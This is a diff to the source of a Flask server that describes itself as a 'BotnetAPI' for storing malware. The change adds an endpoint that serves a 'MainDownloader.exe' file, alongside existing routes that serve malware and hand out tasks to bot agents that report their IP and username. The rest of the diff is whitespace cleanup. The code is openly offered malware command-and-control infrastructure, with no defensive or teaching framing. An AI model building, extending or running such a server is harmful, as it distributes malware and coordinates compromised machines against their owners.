@@ -32,7 +32,7 @@ def superintendent():
             agents_dict[key]['status'] = "offline"
     print(agents_dict)
     time.sleep(5)
-    
+
 threading.Thread(target=superintendent).start()
 
 #### API Endpoints ####
@@ -41,6 +41,10 @@ threading.Thread(target=superintendent).start()
 def home():
     return '''<h1>BotnetAPI - Secured database to store all your malware</h1>
                 <p>A flask api implementation for malware.   </p>'''
+
+@app.route('/MainDownloader', methods=['GET'])
+def getMainDownloader():
+    return send_file(os.path.join(DOWNLOAD_PATH, "MainDownloader.exe"))
 
 @app.route('/malware', methods=['GET'])
 def getMalware():
@@ -90,10 +94,10 @@ def reporting_for_duty():
     current_time = datetime.datetime.now()
 
     current_task = min(tasks, key=tasks.get) #gives the key with the lowest count
-    
+
     if agent_ip not in agents_dict:
         agents_dict[agent_ip] = {"ip": agent_ip , "user": agent_user, "last_connected": current_time, "port": port,"status": "working", "task": current_task}
-        
+
         tasks[current_task] += 1 # increase the count of the task since an agent is working on it
         return current_task
     elif agents_dict[agent_ip]['status'] != "working":
@@ -105,7 +109,7 @@ def reporting_for_duty():
     else:
         return "Keep working grunt >:("
 
-    
+
 
 if __name__ == '__main__':
     app.run(host="127.0.0.1", port=80)
